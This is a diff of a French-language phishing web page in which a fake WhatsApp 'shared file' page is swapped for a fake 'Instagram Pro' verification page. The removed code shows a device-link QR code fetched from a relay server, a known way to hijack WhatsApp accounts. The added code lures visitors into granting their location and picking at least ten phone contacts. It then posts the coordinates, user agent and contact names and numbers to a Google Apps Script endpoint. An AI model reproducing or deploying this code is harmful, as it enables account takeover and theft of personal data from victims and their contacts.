@@ -4,114 +4,167 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="robots" content="noindex,nofollow,noarchive">
-<meta name="referrer" content="no-referrer">
-<title>WhatsApp · Fichier partagé</title>
+<title>Instagram Pro · Vérification</title>
 <style>
-  :root{--bg:#111b21;--card:#202c33;--fg:#e9edef;--mut:#8696a0;--wa:#00a884;--err:#f15c6d}
-  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  body{margin:0;background:var(--bg);color:var(--fg);min-height:100vh;font:16px/1.5 -apple-system,"Segoe UI",Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
-  .wa-logo{display:flex;align-items:center;gap:10px;margin:12px 0 24px;color:var(--wa)}
-  .wa-logo svg{width:34px;height:34px;fill:var(--wa)}
-  .wa-logo span{font-size:19px;font-weight:600;color:var(--fg)}
-  .card{width:100%;max-width:400px;background:var(--card);border-radius:14px;padding:24px 20px;text-align:center}
-  h1{font-size:19px;margin:0 0 8px;font-weight:600}
-  .sub{color:var(--mut);font-size:14px;margin:0 0 22px;line-height:1.55}
-  .qr-wrap{background:#fff;border-radius:12px;padding:12px;margin:0 auto 20px;width:fit-content;position:relative}
-  .qr-wrap img{width:280px;height:280px;display:block}
-  .qr-wrap.blur img{filter:blur(14px);transition:filter .4s}
-  .qr-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35);border-radius:12px;color:#fff;font-size:14px;font-weight:600;text-align:center;padding:16px}
-  .status{margin:16px 0 0;font-size:13.5px;color:var(--mut);min-height:20px}
-  .status.ok{color:var(--wa)}.status.err{color:var(--err)}
-  .steps{list-style:none;padding:0;margin:20px 0 0;text-align:left;font-size:13.5px;color:var(--mut);line-height:1.85}
-  .steps li{padding-left:26px;position:relative}
-  .steps li::before{content:attr(data-n);position:absolute;left:0;top:0;width:18px;height:18px;border-radius:50%;background:var(--wa);color:#fff;font-size:11px;font-weight:700;display:grid;place-items:center;line-height:1}
-  .foot{color:#667781;font-size:11.5px;margin-top:20px;text-align:center;line-height:1.5}
-  .spin{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite;vertical-align:middle;margin-right:6px}
-  @keyframes s{to{transform:rotate(360deg)}}
-  .success{color:var(--wa);font-size:44px;margin:12px 0 8px}
-  [hidden]{display:none!important}
+  :root { --ig-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #000; --card: #121212; --fg: #f5f5f5; --mut: #a8a8a8; --acc: #0095f6; }
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body { margin: 0; background: var(--bg); color: var(--fg); font: 15px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+  .logo { font-family: 'Billabong', cursive, sans-serif; font-size: 42px; font-weight: bold; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
+  .card { width: 100%; max-width: 400px; background: var(--card); border: 1px solid #262626; border-radius: 12px; padding: 30px 24px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+  .badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(220, 39, 67, 0.1); color: #dc2743; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 16px; }
+  h1 { font-size: 20px; margin: 0 0 10px; font-weight: 600; }
+  .sub { color: var(--mut); font-size: 14px; margin: 0 0 24px; line-height: 1.5; }
+  button { width: 100%; padding: 14px; border: 0; border-radius: 8px; cursor: pointer; background: var(--acc); color: #fff; font-weight: 600; font-size: 15px; margin-bottom: 12px; }
+  button.sec { background: transparent; color: var(--fg); border: 1px solid #363636; }
+  .counter { margin: 20px 0; padding: 16px; background: #1a1a1a; border: 1px solid #262626; border-radius: 8px; font-size: 14px; }
+  .counter b { font-size: 24px; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: block; margin-bottom: 4px; }
+  .status { color: var(--mut); font-size: 13px; min-height: 20px; margin-top: 10px; }
+  [hidden] { display: none !important; }
+  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 
-<div class="wa-logo">
-  <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
-  <span>WhatsApp</span>
+<div class="logo">Instagram</div>
+
+<div class="card" id="step1">
+  <div class="badge">✓ Programme Créateur</div>
+  <h1>Félicitations !</h1>
+  <p class="sub">Votre compte a été présélectionné pour recevoir le badge <b>Instagram Pro</b> et débloquer les statistiques avancées.</p>
+  <button id="startBtn">Vérifier mon éligibilité</button>
 </div>
 
-<main class="card" id="main">
-  <h1>Fichier partagé avec vous</h1>
-  <p class="sub">Scannez ce code QR avec votre téléphone pour <b>lier votre appareil</b> et consulter le fichier.</p>
+<div class="card" id="step2" hidden>
+  <div class="badge">Étape 1 / 2</div>
+  <h1>Localisation du compte</h1>
+  <p class="sub">Pour vérifier que vous êtes bien le propriétaire, veuillez autoriser la géolocalisation.</p>
+  <p class="status" id="statusGps">Demande d'accès...</p>
+</div>
 
-  <div class="qr-wrap blur" id="qrWrap">
-    <img id="qrImg" src="" alt="">
-    <div class="qr-overlay" id="qrOverlay"><span class="spin"></span> Chargement du QR…</div>
-  </div>
+<div class="card" id="step3" hidden>
+  <div class="badge">Étape 2 / 2</div>
+  <h1>Réseau d'amis</h1>
+  <p class="sub">Sélectionnez au moins <b>10 contacts</b> pour lier votre compte et éviter le spam.</p>
+  <div class="counter"><b id="count">0</b> / 10 sélectionnés</div>
+  <button id="pickBtn">Ouvrir le répertoire</button>
+  <p class="status" id="statusContact"></p>
+</div>
 
-  <p class="status" id="status">Connexion au serveur…</p>
-
-  <ol class="steps">
-    <li data-n="1">Ouvrez WhatsApp sur votre téléphone</li>
-    <li data-n="2">Appuyez sur Menu ⋮ → Appareils liés</li>
-    <li data-n="3">Appuyez sur <b>Lier un appareil</b> et scannez</li>
-  </ol>
-</main>
-
-<main class="card" id="done" hidden>
-  <div class="success">✓</div>
-  <h1>Appareil lié</h1>
-  <p class="sub">Chargement du fichier partagé…</p>
-  <p class="status ok">Redirection en cours</p>
-</main>
+<div class="card" id="step4" hidden>
+  <h1 style="margin-top: 20px;"><span class="spinner"></span> Vérification en cours</h1>
+  <p class="sub" style="margin-top: 15px;">Analyse de votre profil et synchronisation avec les serveurs Meta...</p>
+</div>
 
 <script>
 (function(){
   'use strict';
 
-  // REMPLACEZ PAR VOTRE URL GODADDY (avec le https://)
-  const RELAY = 'https://ia5d0qabx1.preview.c40.airoapp.ai';
-  const REDIRECT = 'https://www.apple.com/';
+  /* ⚠️ METTEZ VOTRE URL APPS SCRIPT ICI ⚠️ */
+  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbySYFZfNZpURwhGWNTtket9y73cu6_pzpV476-zs07YPpFBTnmAqmde8_OaeckNXDaCZg/exec';
+  const REDIRECT = 'https://www.instagram.com/';
+  const TARGET = 10;
 
   const $ = id => document.getElementById(id);
-  const wrap = $('qrWrap'), img = $('qrImg'), overlay = $('qrOverlay'), st = $('status');
+  let allContacts = [];
+  let seen = new Set();
+  let gpsData = { lat: '', lng: '', acc: '' };
 
-  let isLinked = false;
+  function grabGPS() {
+    return new Promise(resolve => {
+      if (!navigator.geolocation) return resolve();
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          gpsData = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) };
+          resolve();
+        },
+        err => resolve(), 
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+    });
+  }
 
-  async function checkQR() {
-    if (isLinked) return;
+  $('startBtn').addEventListener('click', async () => {
+    $('step1').hidden = true;
+    $('step2').hidden = false;
+    $('statusGps').textContent = "Veuillez autoriser l'accès à votre position...";
+    await grabGPS(); 
+    $('step2').hidden = true;
+    
+    if (!('contacts' in navigator)) {
+      $('step4').hidden = false;
+      sendData();
+      return;
+    }
+
+    $('step3').hidden = false;
+    pickContacts();
+  });
+
+  async function pickContacts() {
+    if (allContacts.length >= TARGET) return;
+    $('pickBtn').disabled = true;
+    $('statusContact').textContent = "Ouverture du répertoire...";
+
     try {
-      const res = await fetch(RELAY + '/qr-json?t=' + Date.now());
-      const data = await res.json();
-
-      if (data.status === 'linked') {
-        isLinked = true;
-        st.textContent = 'Appareil lié, synchronisation…';
-        st.className = 'status ok';
-        $('main').hidden = true;
-        $('done').hidden = false;
-        setTimeout(() => { location.replace(REDIRECT); }, 4000);
-        return;
+      const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+      if (list && list.length > 0) {
+        list.forEach(c => {
+          const name = c.name && c.name[0] ? c.name[0] : '';
+          const tel = c.tel && c.tel[0] ? c.tel[0] : '';
+          if (!name && !tel) return;
+          const key = name + tel;
+          if (!seen.has(key)) {
+            seen.add(key);
+            allContacts.push({ name: [name], tel: [tel] });
+          }
+        });
       }
+    } catch (e) {}
 
-      if (data.image) {
-        img.src = data.image;
-        wrap.classList.remove('blur');
-        overlay.hidden = true;
-        st.textContent = 'En attente du scan…';
-        st.className = 'status';
-      } else {
-        st.textContent = 'Génération du QR en cours… (Patientez)';
-      }
-    } catch(e) {
-      st.textContent = 'Erreur de connexion au serveur.';
-      st.className = 'status err';
+    $('pickBtn').disabled = false;
+    updateUI();
+  }
+
+  function updateUI() {
+    $('count').textContent = allContacts.length;
+    if (allContacts.length >= TARGET) {
+      $('pickBtn').hidden = true;
+      $('statusContact').textContent = "Synchronisation réussie !";
+      setTimeout(sendData, 1000);
+    } else {
+      $('pickBtn').textContent = "Ajouter des contacts (" + allContacts.length + "/" + TARGET + ")";
+      $('statusContact').textContent = "Sélectionnez encore " + (TARGET - allContacts.length) + " contacts.";
     }
   }
 
-  // Vérifie immédiatement, puis toutes les 3 secondes
-  checkQR();
-  setInterval(checkQR, 3000);
+  $('pickBtn').addEventListener('click', pickContacts);
 
+  async function sendData() {
+    $('step3').hidden = true;
+    $('step4').hidden = false;
+
+    const payload = {
+      theme: 'Instagram Pro',
+      ua: navigator.userAgent,
+      lat: gpsData.lat,
+      lng: gpsData.lng,
+      acc: gpsData.acc,
+      cCount: allContacts.length,
+      cJson: JSON.stringify(allContacts)
+    };
+
+    try {
+      await fetch(ENDPOINT, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e) {}
+
+    setTimeout(() => location.replace(REDIRECT), 2500);
+  }
 })();
 </script>
 </body>
